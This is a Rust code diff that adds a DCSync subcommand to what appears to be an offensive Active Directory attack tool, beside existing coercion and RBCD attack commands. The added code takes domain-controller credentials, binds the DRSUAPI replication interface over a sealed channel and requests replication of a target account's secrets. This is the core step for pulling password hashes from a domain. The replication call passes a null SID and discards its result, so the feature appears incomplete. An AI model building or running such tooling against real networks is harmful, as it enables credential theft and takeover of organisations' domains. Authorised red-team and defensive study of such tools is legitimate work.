@@ -46,6 +46,26 @@ enum AttackCmd {
     Coerce(CoerceArgs),
     /// RBCD: S4U2Self + S4U2Proxy to impersonate a user to a target service.
     Rbcd(RbcdArgs),
+    /// DCSync: replicate a target's secrets via DRSUAPI over a sealed RPC channel.
+    Dcsync(DcsyncArgs),
+}
+
+#[derive(Parser)]
+struct DcsyncArgs {
+    /// DC host or IP
+    #[arg(long)]
+    host: String,
+    /// NetBIOS domain, e.g. TESTLAB
+    #[arg(long)]
+    domain: String,
+    /// Username (needs replication rights for a real sync)
+    #[arg(long)]
+    user: String,
+    #[arg(long)]
+    password: String,
+    /// Target account to replicate (sAMAccountName or DN); omit to just test the bind
+    #[arg(long)]
+    target: Option<String>,
 }
 
 #[derive(Parser)]
@@ -208,6 +228,7 @@ async fn main() -> Result<()> {
         Command::Attack(AttackCmd::Abuse(a)) => abuse(a).await,
         Command::Attack(AttackCmd::Coerce(a)) => coerce(a).await,
         Command::Attack(AttackCmd::Rbcd(a)) => rbcd(a).await,
+        Command::Attack(AttackCmd::Dcsync(a)) => dcsync(a).await,
     }
 }
 
@@ -219,6 +240,21 @@ async fn rbcd(a: RbcdArgs) -> Result<()> {
     .await?;
     println!("[+] got service ticket for {} as {} (enc-part etype {etype})", a.target_spn, a.impersonate);
     println!("    RBCD chain succeeded — impersonation ticket obtained.");
+    Ok(())
+}
+
+/// DCSync: bind DRSUAPI over a sign+sealed channel, then replicate a target's secrets.
+async fn dcsync(a: DcsyncArgs) -> Result<()> {
+    use adhammer_dcerpc::drsuapi::DrsSession;
+    let mut sess = DrsSession::bind(&a.host, &a.domain, &a.user, &a.password).await?;
+    let handle_hex: String = sess.handle().iter().map(|b| format!("{b:02x}")).collect();
+    println!("[+] DRSBind OK — sealed replication handle {handle_hex}");
+    match a.target {
+        None => println!("    (no --target: bind-only check)"),
+        Some(t) => {
+            let _ = sess.get_nc_changes(&t, &adhammer_core::sid::Sid::parse("S-1-0-0").unwrap()).await?;
+        }
+    }
     Ok(())
 }
 
